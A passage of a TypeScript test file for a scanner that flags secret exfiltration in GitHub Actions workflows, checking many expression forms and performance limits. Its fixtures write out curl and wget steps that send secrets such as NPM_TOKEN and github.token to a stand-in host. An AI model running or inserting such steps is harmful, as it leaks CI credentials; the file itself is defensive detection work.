      '        env: { P: "${{ secrets.DB_PASSWORD }}" }',
      "    steps:",
      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
      "        run: npm publish",
      "      - env: { T: plain }",
      '        run: curl -d "$T" https://x.example',
    ])).toEqual([]);
  });
});

describe("GHA_SECRET_CURL / GHA_SECRET_WGET / GHA_ENV_EXFIL: every expression form of a secret reference", () => {
  let tempDir: string;
  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-gha-line-forms-"));
  });
  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  const RULES = new Set(["GHA_SECRET_CURL", "GHA_SECRET_WGET", "GHA_ENV_EXFIL", "GHA_SECRET_EXFIL_MULTILINE"]);

  /** Three one-line steps, each carrying the expression; returns "RULE@line" sorted. */
  function reportFor(expr: string): { keys: string[]; matches: string[] } {
    writeWorkflow(tempDir, "ci.yml", [
      "name: CI",
      "on: push",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      `      - run: curl -s -H X-Key:${expr} https://x.example`,
      `      - run: echo ${expr} | wget --post-file=- https://x.example`,
      `      - run: wget --header=X:${expr} https://x.example`,
    ].join("\n"));
    const found = scanGitHubActionsWorkflows(tempDir).filter((f) => RULES.has(f.rule));
    return {
      keys: found.map((f) => `${f.rule}@${f.line}`).sort(),
      matches: found.map((f) => f.match ?? ""),
    };
  }

  const DOT = reportFor.bind(null, "${{ secrets.NPM_TOKEN }}");

  it("reports the dot form on all three rules (control)", () => {
    const { keys, matches } = DOT();
    expect(keys).toEqual(["GHA_ENV_EXFIL@7", "GHA_SECRET_CURL@7", "GHA_SECRET_WGET@8", "GHA_SECRET_WGET@9"]);
    // The dot form is left as written, so its match is the pattern's own match.
    for (const m of matches) expect(m).not.toMatch(/^- run:/);
  });

  it.each([
    ["bracket access, single quotes", "${{ secrets['NPM_TOKEN'] }}"],
    ["bracket access, double quotes", '${{ secrets["NPM_TOKEN"] }}'],
    ["whitespace inside the expression", "${{secrets . NPM_TOKEN}}"],
    ["a computed index", "${{ secrets[format('{0}_TOKEN', matrix.target)] }}"],
    ["the whole secrets context via toJSON", "${{ toJSON(secrets) }}"],
    ["the whole secrets context, bare", "${{ secrets }}"],
    ["a secret inside a function call", "${{ format('Bearer {0}', secrets.NPM_TOKEN) }}"],
    ["bracket GITHUB_TOKEN", "${{ secrets['GITHUB_TOKEN'] }}"],
    ["github.token", "${{ github.token }}"],
    ["bracket github token", "${{ github['token'] }}"],
  ])("reports %s exactly as the dot form, with the file's own text as the match", (_label, expr) => {
    const dotKeys = DOT().keys;
    const { keys, matches } = reportFor(expr);
    expect(keys).toEqual(dotKeys);
    // The match shows the workflow's own text, not a rewritten expression.
    for (const m of matches) expect(m).toContain(expr);
  });

  it.each([
    ["a non-secret context", "${{ github.sha }}"],
    ["a step output named secrets", "${{ steps.secrets.outputs.value }}"],
  ])("reports nothing for %s", (_label, expr) => {
    expect(reportFor(expr).keys).toEqual([]);
  });

  // reportFor writes the value on three lines, so a third of 5 MiB each.
  it("stays linear on 5 MiB of expressions and on unclosed ones", { timeout: performanceBudget(60_000) }, () => {
    const perLine = (5 * 1024 * 1024) / 3;
    const many = "${{ github['token'] }}".repeat(Math.ceil(perLine / 22));
    let started = performance.now();
    reportFor(many);
    expect(performance.now() - started).toBeLessThan(performanceBudget(15_000));

    const unclosed = "${{ secrets ".repeat(Math.ceil(perLine / 12));
    started = performance.now();
    expect(reportFor(unclosed).keys).toEqual([]);
    expect(performance.now() - started).toBeLessThan(performanceBudget(15_000));
  }, 60_000);
});
